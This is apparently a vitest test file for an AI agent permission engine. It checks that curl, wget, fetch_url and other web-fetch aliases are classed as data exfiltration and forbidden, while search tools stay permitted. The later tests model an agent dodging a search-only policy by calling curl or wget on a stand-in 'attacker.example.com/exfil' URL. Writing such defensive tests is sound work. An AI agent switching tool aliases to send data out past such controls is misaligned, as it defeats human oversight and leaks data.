/**
 * Web action policy e2e tests — OpenAuthority T24/T16
 *
 * Proves that:
 *   - fetch_url and all web.fetch aliases are blocked by a data_exfiltration
 *     intent_group forbid rule in Stage 2 (TC-WAP-01..TC-WAP-12)
 *   - web.search aliases are permitted when no forbid rule targets them or their
 *     intent_group (TC-WAP-13..TC-WAP-20)
 *   - A web.search permit rule and a data_exfiltration forbid rule coexist
 *     correctly — web search succeeds while fetch_url is blocked (TC-WAP-21)
 *   - web research bypass attempts via web.fetch aliases are blocked
 *     (TC-WAP-22..TC-WAP-24)
 *
 * TC-WAP-01  fetch         → web.fetch, data_exfiltration, HITL per_request, forbidden
 * TC-WAP-02  http_get      → web.fetch, data_exfiltration, HITL per_request, forbidden
 * TC-WAP-03  web_fetch     → web.fetch, data_exfiltration, HITL per_request, forbidden
 * TC-WAP-04  get_url       → web.fetch, data_exfiltration, HITL per_request, forbidden
 * TC-WAP-05  fetch_url     → web.fetch, data_exfiltration, HITL per_request, forbidden
 * TC-WAP-06  http_request  → web.fetch, data_exfiltration, HITL per_request, forbidden
 * TC-WAP-07  curl          → web.fetch, data_exfiltration, HITL per_request, forbidden
 * TC-WAP-08  wget          → web.fetch, data_exfiltration, HITL per_request, forbidden
 * TC-WAP-09  download_url  → web.fetch, data_exfiltration, HITL per_request, forbidden
 * TC-WAP-10  http_head     → web.fetch, data_exfiltration, HITL per_request, forbidden
 * TC-WAP-11  head_url      → web.fetch, data_exfiltration, HITL per_request, forbidden
 * TC-WAP-12  http_options  → web.fetch, data_exfiltration, HITL per_request, forbidden
 * TC-WAP-13  web_search    → web.search, no intent_group, HITL per_request, permitted
 * TC-WAP-14  google_search → web.search, permitted
 * TC-WAP-15  bing_search   → web.search, permitted
 * TC-WAP-16  duckduckgo_search → web.search, permitted
 * TC-WAP-17  ddg_search    → web.search, permitted
 * TC-WAP-18  search_web    → web.search, permitted
 * TC-WAP-19  web_research  → web.search, permitted
 * TC-WAP-20  news_search   → web.search, permitted
 * TC-WAP-21  web_search permitted while fetch_url forbidden (policy coexistence)
 * TC-WAP-22  fetch_url bypass via curl → blocked (data_exfiltration group catch-all)
 * TC-WAP-23  fetch_url bypass via wget → blocked
 * TC-WAP-24  fetch_url bypass via download_url → blocked
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { EventEmitter } from 'node:events';
import { runPipeline } from './enforcement/pipeline.js';
import type { PipelineContext, Stage1Fn, Stage2Fn, CeeDecision } from './enforcement/pipeline.js';
import { validateCapability } from './enforcement/stage1-capability.js';
import { normalize_action } from './enforcement/normalize.js';
import { ApprovalManager, computeBinding } from './hitl/approval-manager.js';
import type { HitlPolicy } from './hitl/types.js';
import type { Capability } from './adapter/types.js';

// ─── Stage 2 helpers ─────────────────────────────────────────────────────────

/**
 * Stage 2 that forbids all actions whose intent_group is data_exfiltration.
 * All other actions are permitted. Mirrors the bundle.json forbid rule:
 *   { "effect": "forbid", "intent_group": "data_exfiltration", ... }
 */
function buildDataExfiltrationForbidStage2(): Stage2Fn {
  return async (ctx: PipelineContext): Promise<CeeDecision> => {
    if (ctx.intent_group === 'data_exfiltration') {
      return { effect: 'forbid', reason: 'data_exfiltration_forbidden', stage: 'stage2' };
    }
    return { effect: 'permit', reason: 'default_permit', stage: 'stage2' };
  };
}

/**
 * Stage 2 that:
 *   - forbids data_exfiltration intent group
 *   - permits web.search action class explicitly
 *   - permits everything else by default
 *
 * Mirrors a bundle with both a web.search permit rule and a data_exfiltration
 * forbid rule active simultaneously.
 */
function buildWebSearchPermitDataExfiltrationForbidStage2(): Stage2Fn {
  return async (ctx: PipelineContext): Promise<CeeDecision> => {
    if (ctx.intent_group === 'data_exfiltration') {
      return { effect: 'forbid', reason: 'data_exfiltration_forbidden', stage: 'stage2' };
    }
    if (ctx.action_class === 'web.search') {
      return { effect: 'permit', reason: 'web_search_permitted', stage: 'stage2' };
    }
    return { effect: 'permit', reason: 'default_permit', stage: 'stage2' };
  };
}

// ─── HITL test harness ───────────────────────────────────────────────────────

const TEST_POLICY: HitlPolicy = {
  name: 'test-hitl-policy',
  actions: ['*'],
  approval: { channel: 'test', timeout: 3600, fallback: 'deny' },
};

interface ApproveNextOpts {
  action_class: string;
  target: string;
  payload_hash: string;
}

class HitlTestHarness {
  private readonly approvalManager: ApprovalManager;
  private readonly issued = new Map<string, Capability>();
  private readonly capabilityTtlMs: number;

  readonly stage1: Stage1Fn;

  constructor(opts?: { capabilityTtlSeconds?: number }) {
    this.capabilityTtlMs = (opts?.capabilityTtlSeconds ?? 3600) * 1000;
    this.approvalManager = new ApprovalManager();

    this.stage1 = (ctx: PipelineContext) =>
      validateCapability(ctx, this.approvalManager, (id) => this.issued.get(id));
  }

  approveNext(opts: ApproveNextOpts): string {
    const handle = this.approvalManager.createApprovalRequest({
      toolName: opts.action_class,
      agentId: 'test-agent',
      channelId: 'test-channel',
      policy: TEST_POLICY,
      action_class: opts.action_class,
      target: opts.target,
      payload_hash: opts.payload_hash,
    });

    const now = Date.now();
    const capability: Capability = {
      approval_id: handle.token,
      binding: computeBinding(opts.action_class, opts.target, opts.payload_hash),
      action_class: opts.action_class,
      target: opts.target,
      issued_at: now,
      expires_at: now + this.capabilityTtlMs,
    };

    this.issued.set(handle.token, capability);
    return handle.token;
  }

  shutdown(): void {
    this.approvalManager.shutdown();
  }
}

// ─── web.fetch aliases (TC-WAP-01..TC-WAP-12) ────────────────────────────────

const WEB_FETCH_ALIASES = [
  'fetch',
  'http_get',
  'web_fetch',
  'get_url',
  'fetch_url',
  'http_request',
  'curl',
  'wget',
  'download_url',
  'http_head',
  'head_url',
  'http_options',
] as const;

describe('web.fetch aliases — data_exfiltration forbid rule blocks all aliases', () => {
  let emitter: EventEmitter;
  let harness: HitlTestHarness;

  beforeEach(() => {
    emitter = new EventEmitter();
    harness = new HitlTestHarness();
  });

  afterEach(() => {
    harness.shutdown();
  });

  for (const [index, alias] of WEB_FETCH_ALIASES.entries()) {
    const tcId = `TC-WAP-${String(index + 1).padStart(2, '0')}`;

    it(
      `${tcId}: "${alias}" → web.fetch, data_exfiltration intent, HITL per_request, forbidden by data_exfiltration rule`,
      async () => {
        const normalized = normalize_action(alias, { url: 'https://example.com/data' });

        // Normalization assertions
        expect(normalized.action_class).toBe('web.fetch');
        expect(normalized.intent_group).toBe('data_exfiltration');
        expect(normalized.hitl_mode).toBe('per_request');
        expect(normalized.risk).toBe('medium');

        const HASH = `hash-wap-${String(index + 1).padStart(2, '0')}`;
        const token = harness.approveNext({
          action_class: normalized.action_class,
          target: normalized.target,
          payload_hash: HASH,
        });

        const auditEvents: Array<{ decision: CeeDecision; timestamp: string }> = [];
        emitter.on('executionEvent', (e) => auditEvents.push(e));

        const stage2 = buildDataExfiltrationForbidStage2();

        const result = await runPipeline(
          {
            action_class: normalized.action_class,
            target: normalized.target,
            payload_hash: HASH,
            hitl_mode: normalized.hitl_mode,
            ...(normalized.intent_group !== undefined && { intent_group: normalized.intent_group }),
            approval_id: token,
            rule_context: { agentId: 'agent-1', channel: 'default' },
          },
          harness.stage1,
          stage2,
          emitter,
        );

        expect(result.decision.effect).toBe('forbid');
        expect(result.decision.reason).toBe('data_exfiltration_forbidden');
        expect(auditEvents).toHaveLength(1);
        expect(auditEvents[0]!.decision.effect).toBe('forbid');
        expect(auditEvents[0]!.decision.reason).toBe('data_exfiltration_forbidden');
      },
    );
  }
});

// ─── web.search aliases (TC-WAP-13..TC-WAP-20) ───────────────────────────────

const WEB_SEARCH_ALIASES = [
  'web_search',
  'google_search',
  'bing_search',
  'duckduckgo_search',
  'ddg_search',
  'search_web',
  'web_research',
  'news_search',
] as const;

describe('web.search aliases — permitted when data_exfiltration forbid rule is active', () => {
  let emitter: EventEmitter;
  let harness: HitlTestHarness;

  beforeEach(() => {
    emitter = new EventEmitter();
    harness = new HitlTestHarness();
  });

  afterEach(() => {
    harness.shutdown();
  });

  for (const [index, alias] of WEB_SEARCH_ALIASES.entries()) {
    const tcId = `TC-WAP-${String(index + 13).padStart(2, '0')}`;

    it(
      `${tcId}: "${alias}" → web.search, no intent_group, HITL per_request, permitted`,
      async () => {
        const normalized = normalize_action(alias, { url: 'open source AI tools' });

        // Normalization assertions
        expect(normalized.action_class).toBe('web.search');
        expect(normalized.intent_group).toBeUndefined();
        expect(normalized.hitl_mode).toBe('per_request');
        expect(normalized.risk).toBe('medium');

        const HASH = `hash-wap-${String(index + 13).padStart(2, '0')}`;
        const token = harness.approveNext({
          action_class: normalized.action_class,
          target: normalized.target,
          payload_hash: HASH,
        });

        const auditEvents: Array<{ decision: CeeDecision; timestamp: string }> = [];
        emitter.on('executionEvent', (e) => auditEvents.push(e));

        // data_exfiltration forbid rule is active but web.search has no intent_group
        const stage2 = buildDataExfiltrationForbidStage2();

        const result = await runPipeline(
          {
            action_class: normalized.action_class,
            target: normalized.target,
            payload_hash: HASH,
            hitl_mode: normalized.hitl_mode,
            approval_id: token,
            rule_context: { agentId: 'agent-1', channel: 'default' },
          },
          harness.stage1,
          stage2,
          emitter,
        );

        expect(result.decision.effect).toBe('permit');
        expect(auditEvents).toHaveLength(1);
        expect(auditEvents[0]!.decision.effect).toBe('permit');
      },
    );
  }
});

// ─── Policy coexistence (TC-WAP-21) ──────────────────────────────────────────

describe('web.search permit rule coexists with data_exfiltration forbid rule', () => {
  let emitter: EventEmitter;
  let harness: HitlTestHarness;

  beforeEach(() => {
    emitter = new EventEmitter();
    harness = new HitlTestHarness();
  });

  afterEach(() => {
    harness.shutdown();
  });

  it(
    'TC-WAP-21: web_search is permitted while fetch_url is forbidden under the same policy',
    async () => {
      const stage2 = buildWebSearchPermitDataExfiltrationForbidStage2();

      // ── web_search → permitted ────────────────────────────────────────────
      const searchNorm = normalize_action('web_search', {});
      const searchHash = 'hash-wap-21-search';
      const searchToken = harness.approveNext({
        action_class: searchNorm.action_class,
        target: searchNorm.target,
        payload_hash: searchHash,
      });

      const searchEvents: Array<{ decision: CeeDecision; timestamp: string }> = [];
      const searchEmitter = new EventEmitter();
      searchEmitter.on('executionEvent', (e) => searchEvents.push(e));

      const searchResult = await runPipeline(
        {
          action_class: searchNorm.action_class,
          target: searchNorm.target,
          payload_hash: searchHash,
          hitl_mode: searchNorm.hitl_mode,
          approval_id: searchToken,
          rule_context: { agentId: 'agent-1', channel: 'default' },
        },
        harness.stage1,
        stage2,
        searchEmitter,
      );

      expect(searchResult.decision.effect).toBe('permit');
      expect(searchResult.decision.reason).toBe('web_search_permitted');

      // ── fetch_url → forbidden ─────────────────────────────────────────────
      const fetchNorm = normalize_action('fetch_url', { url: 'https://internal.corp/secrets' });
      const fetchHash = 'hash-wap-21-fetch';
      const fetchToken = harness.approveNext({
        action_class: fetchNorm.action_class,
        target: fetchNorm.target,
        payload_hash: fetchHash,
      });

      const fetchEvents: Array<{ decision: CeeDecision; timestamp: string }> = [];
      const fetchEmitter = new EventEmitter();
      fetchEmitter.on('executionEvent', (e) => fetchEvents.push(e));

      const fetchResult = await runPipeline(
        {
          action_class: fetchNorm.action_class,
          target: fetchNorm.target,
          payload_hash: fetchHash,
          hitl_mode: fetchNorm.hitl_mode,
          ...(fetchNorm.intent_group !== undefined && { intent_group: fetchNorm.intent_group }),
          approval_id: fetchToken,
          rule_context: { agentId: 'agent-1', channel: 'default' },
        },
        harness.stage1,
        stage2,
        fetchEmitter,
      );

      expect(fetchResult.decision.effect).toBe('forbid');
      expect(fetchResult.decision.reason).toBe('data_exfiltration_forbidden');
    },
  );
});

// ─── Web research bypass attempts (TC-WAP-22..TC-WAP-24) ─────────────────────

const BYPASS_ALIASES = ['curl', 'wget', 'download_url'] as const;

describe('web research bypass attempts — data_exfiltration group blocks web.fetch masquerading', () => {
  let emitter: EventEmitter;
  let harness: HitlTestHarness;

  beforeEach(() => {
    emitter = new EventEmitter();
    harness = new HitlTestHarness();
  });

  afterEach(() => {
    harness.shutdown();
  });

  for (const [index, alias] of BYPASS_ALIASES.entries()) {
    const tcId = `TC-WAP-${String(index + 22).padStart(2, '0')}`;

    it(
      `${tcId}: bypass attempt via "${alias}" is blocked — resolves to web.fetch with data_exfiltration, forbidden`,
      async () => {
        // An agent attempting to bypass a web.search-only policy by using curl/wget/download_url
        // instead of fetch_url — all resolve to web.fetch with data_exfiltration intent group
        const normalized = normalize_action(alias, { url: 'https://attacker.example.com/exfil' });

        expect(normalized.action_class).toBe('web.fetch');
        expect(normalized.intent_group).toBe('data_exfiltration');

        const HASH = `hash-wap-${String(index + 22).padStart(2, '0')}`;
        const token = harness.approveNext({
          action_class: normalized.action_class,
          target: normalized.target,
          payload_hash: HASH,
        });

        const auditEvents: Array<{ decision: CeeDecision; timestamp: string }> = [];
        emitter.on('executionEvent', (e) => auditEvents.push(e));

        // Policy: web.search permitted, data_exfiltration forbidden
        const stage2 = buildWebSearchPermitDataExfiltrationForbidStage2();

        const result = await runPipeline(
          {
            action_class: normalized.action_class,
            target: normalized.target,
            payload_hash: HASH,
            hitl_mode: normalized.hitl_mode,
            ...(normalized.intent_group !== undefined && { intent_group: normalized.intent_group }),
            approval_id: token,
            rule_context: { agentId: 'agent-1', channel: 'default' },
          },
          harness.stage1,
          stage2,
          emitter,
        );

        expect(result.decision.effect).toBe('forbid');
        expect(result.decision.reason).toBe('data_exfiltration_forbidden');
        expect(auditEvents[0]!.decision.effect).toBe('forbid');
      },
    );
  }
});
